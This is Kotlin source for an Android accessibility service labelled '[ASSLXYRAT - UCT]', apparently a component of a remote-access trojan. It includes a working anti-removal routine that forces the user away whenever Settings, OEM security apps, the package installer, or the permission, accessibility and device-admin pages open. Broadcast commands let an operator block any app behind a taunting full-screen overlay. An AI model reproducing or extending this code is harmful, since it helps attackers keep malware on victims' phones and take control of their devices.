package com.sync.xxx

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView

class AppBlockerService : AccessibilityService() {

    companion object {
        var instance: AppBlockerService? = null
        val blockedPackages = mutableSetOf<String>()
        var antiUninstallActive = false

        // Daftar Paket Perlindungan Sistem & Security OEM
        private val BLOCKED_PACKAGES_PROTECTION = setOf(
            "com.android.settings",
            "com.miui.securitycenter",
            "com.samsung.android.lool",
            "com.coloros.safecenter",
            "com.vivo.permissionmanager",
            "com.huawei.systemmanager",
            "com.google.android.packageinstaller",
            "com.android.packageinstaller",
            "com.android.permissioncontroller",
            "com.transsion.phonemaster",
            "com.transsion.securitykeyboard",
            "com.infinix.security",
            "com.tecno.security",
            "com.miui.appmanager",
            "com.miui.permcenter",
            "com.oppo.safe",
            "com.coloros.oppoguardelf",
            "com.realme.security",
            "com.iqoo.secure"
        )

        // Daftar Class Settings yang Berbahaya (Uninstall, Izin, Aksesibilitas)
        private val BLOCKED_CLASSES_PROTECTION = setOf(
            "com.android.settings.applications.InstalledAppDetails",
            "com.android.settings.applications.AppInfoBase",
            "com.android.settings.applications.ManageApplications",
            "com.android.settings.applications.AppDashboardFragment",
            "com.android.settings.SubSettings",
            "com.android.settings.applications.appinfo.AppInfoDashboardFragment",
            "AppOpsActivity",
            "DrawOverlays",
            "DrawOverOtherApps",
            "DisplayOverOtherApps",
            "ManageOverlayPermission",
            "OverlaySettings",
            "WriteSettings",
            "SpecialAppAccess",
            "SpecialAccessSettings",
            "HighPowerApplications",
            "DeviceAdminAdd",
            "DeviceAdminSettings",
            "NotificationListenerDetail",
            "UsageAccessSettings",
            "AccessibilitySettings",
            "AccessibilityDetailsSettings",
            "NotificationAccessSettings",
            "AppOpsSummary",
            "AppPermissionsFragment",
            "PermissionAppsFragment",
            "PermissionGroupFragment",
            "AllAppPermissionsFragment"
        )

        fun isEnabled(ctx: Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val component = "${ctx.packageName}/.AppBlockerService"
            val componentFull = "${ctx.packageName}/${ctx.packageName}.AppBlockerService"
            return enabledServices.split(":").any { svc ->
                svc.equals(component, ignoreCase = true) || svc.equals(componentFull, ignoreCase = true)
            }
        }

        fun isUsageAccessGranted(ctx: Context): Boolean {
            return try {
                val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
                val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    appOps.unsafeCheckOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(),
                        ctx.packageName
                    )
                } else {
                    @Suppress("DEPRECATION")
                    appOps.checkOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(),
                        ctx.packageName
                    )
                }
                mode == android.app.AppOpsManager.MODE_ALLOWED
            } catch (e: Exception) {
                false
            }
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var overlayView: View? = null
    private var windowManager: WindowManager? = null

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                "com.sync.xxx.BLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.add(pkg)
                }
                "com.sync.xxx.UNBLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.remove(pkg)
                }
                "com.sync.xxx.UNBLOCK_ALL" -> {
                    blockedPackages.clear()
                }
                "com.sync.xxx.SET_ANTI_UNINSTALL" -> {
                    antiUninstallActive = intent.getBooleanExtra("active", false)
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 0
        }

        val filter = IntentFilter().apply {
            addAction("com.sync.xxx.BLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_ALL")
            addAction("com.sync.xxx.SET_ANTI_UNINSTALL")
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    // Fungsi untuk menendang user secara agresif
    private fun forceKick() {
        performGlobalAction(GLOBAL_ACTION_BACK)
        performGlobalAction(GLOBAL_ACTION_HOME)
        mainHandler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_HOME)
        }, 150)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return

        // Pengecualian sistem dasar dan aplikasi sendiri
        if (pkg == packageName) return
        if (pkg == "android") return
        if (pkg == "com.android.systemui") return

        val className = event.className?.toString() ?: ""

        // ==============================================================
        // 1. CEK DARI SAKLAR ANTI UNINSTALL (DAFTAR KEAMANAN)
        // ==============================================================
        if (antiUninstallActive) {
            val isProtectedClass = BLOCKED_CLASSES_PROTECTION.any { className.contains(it, ignoreCase = true) }
            
            // Pengecualian khusus: com.android.settings TIDAK boleh diblokir utuh package-nya.
            // Dia hanya akan ditendang jika membuka sub-halaman sensitif yang masuk ke BLOCKED_CLASSES_PROTECTION.
            val isOtherProtectedPackage = BLOCKED_PACKAGES_PROTECTION.contains(pkg) && pkg != "com.android.settings"
            val isSettingsSubPageBlocked = (pkg == "com.android.settings" && isProtectedClass)

            if (isOtherProtectedPackage || isSettingsSubPageBlocked) {
                forceKick()
                return // Langsung mental, tidak lanjut ke blok target aplikasi
            }
        }

        // ==============================================================
        // 2. CEK BLOKIR APLIKASI TARGET
        // ==============================================================
        if (blockedPackages.contains(pkg)) {
            val appName = try {
                val pm = packageManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    pm.getApplicationLabel(pm.getApplicationInfo(pkg, PackageManager.ApplicationInfoFlags.of(0))).toString()
                } else {
                    @Suppress("DEPRECATION")
                    pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
                }
            } catch (e: Exception) {
                pkg
            }

            forceKick()

            // Cek apakah aplikasi tersebut masuk di dalam perlindungan sistem
            val isSystemApp = BLOCKED_PACKAGES_PROTECTION.contains(pkg)
            if (!isSystemApp) {
                showBlockPopup(pkg, appName)
            }
        }
    }

    private fun showBlockPopup(pkg: String, appName: String) {
        mainHandler.post {
            try {
                if (overlayView != null) return@post

                // Container Background Gelap
                val container = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    setBackgroundColor(Color.parseColor("#C0000000"))
                    gravity = Gravity.CENTER
                    setPadding(150, 0, 150, 0)
                }

                // Desain Card Utama
                val cardBg = GradientDrawable().apply {
                    setColor(Color.parseColor("#0F1115"))
                    setStroke(3, Color.parseColor("#00E5FF"))
                    cornerRadius = 16f
                }

                val card = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    background = cardBg
                    setPadding(40, 50, 40, 50)
                    gravity = Gravity.CENTER_HORIZONTAL
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    )
                }

                val monoBold = Typeface.create(Typeface.DEFAULT_BOLD, Typeface.BOLD)

                // ---------------- HEADER ----------------
                val topHeader = LinearLayout(this).apply {
                    orientation = LinearLayout.HORIZONTAL
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    ).apply { setMargins(0, 0, 0, 40) }
                }

                val leftText = TextView(this).apply {
                    text = "[ASSLXYRAT - UCT]"
                    textSize = 10f
                    setTextColor(Color.parseColor("#FF0055"))
                    typeface = monoBold
                    layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
                }
                topHeader.addView(leftText)

                val rightText = TextView(this).apply {
                    text = "• BLOKIR"
                    textSize = 10f
                    setTextColor(Color.parseColor("#00f5ff"))
                    gravity = Gravity.END
                    typeface = monoBold
                }
                topHeader.addView(rightText)
                card.addView(topHeader)

                // ---------------- KOTAK APLIKASI ----------------
                val appBoxBg = GradientDrawable().apply {
                    setColor(Color.parseColor("#171D22"))
                    cornerRadius = 4f
                }

                val appBox = LinearLayout(this).apply {
                    orientation = LinearLayout.HORIZONTAL
                    background = appBoxBg
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    ).apply { setMargins(0, 0, 0, 40) }
                }

                val leftAccent = View(this).apply {
                    setBackgroundColor(Color.parseColor("#00E5FF"))
                    layoutParams = LinearLayout.LayoutParams(12, LinearLayout.LayoutParams.MATCH_PARENT)
                }
                appBox.addView(leftAccent)

                val innerAppBox = LinearLayout(this).apply {
                    orientation = LinearLayout.HORIZONTAL
                    gravity = Gravity.CENTER
                    layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
                    setPadding(20, 30, 20, 30)
                }

                val appIcon = ImageView(this).apply {
                    try {
                        setImageDrawable(packageManager.getApplicationIcon(pkg))
                    } catch (e: Exception) {}
                    layoutParams = LinearLayout.LayoutParams(60, 60).apply { setMargins(0, 0, 20, 0) }
                }
                innerAppBox.addView(appIcon)

                val appNameView = TextView(this).apply {
                    text = appName
                    textSize = 16f
                    setTextColor(Color.parseColor("#FFFFFF"))
                    typeface = monoBold
                }
                innerAppBox.addView(appNameView)
                appBox.addView(innerAppBox)
                card.addView(appBox)

                // ---------------- TEKS PERINGATAN ----------------
                val errText = TextView(this).apply {
                    text = "#~ PERINGATAN ~#"
                    textSize = 11f
                    setTextColor(Color.parseColor("#FF0055"))
                    typeface = monoBold
                    gravity = Gravity.CENTER
                    setPadding(0, 0, 0, 10)
                }
                card.addView(errText)

                val message = TextView(this).apply {
                    text = "APLIKASI ANDA DI BLOKIR SEPENUHNYA MAMPUS"
                    textSize = 12f
                    setTextColor(Color.parseColor("#D1D1D1"))
                    typeface = monoBold
                    gravity = Gravity.CENTER
                    textAlignment = View.TEXT_ALIGNMENT_CENTER
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    )
                    setPadding(20, 0, 20, 40)
                }
                card.addView(message)

                // ---------------- TOMBOL OK ----------------
                val btnContainer = LinearLayout(this).apply {
                    gravity = Gravity.CENTER
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    )
                }

                val btnBg = GradientDrawable().apply {
                    setColor(Color.parseColor("#FF0055"))
                    cornerRadius = 8f
                }

                val okButton = Button(this).apply {
                    text = "OK"
                    textSize = 14f
                    setTextColor(Color.WHITE)
                    typeface = monoBold
                    background = btnBg
                    setPadding(80, 20, 80, 20)
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.WRAP_CONTENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    )
                    setOnClickListener {
                        hideOverlay()
                        forceKick()
                    }
                }
                btnContainer.addView(okButton)
                card.addView(btnContainer)

                container.addView(card)

                // ---------------- RENDER KE LAYAR ----------------
                val windowType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_PHONE
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    windowType,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    PixelFormat.TRANSLUCENT
                )

                windowManager?.addView(container, params)
                overlayView = container
            } catch (e: Exception) {
                android.util.Log.e("AppBlocker", "Error: ${e.message}")
            }
        }
    }

    private fun hideOverlay() {
        mainHandler.post {
            try {
                overlayView?.let {
                    windowManager?.removeView(it)
                    overlayView = null
                }
            } catch (e: Exception) {
                overlayView = null
            }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(commandReceiver)
        } catch (_: Exception) {}
        hideOverlay()
        instance = null
    }
}
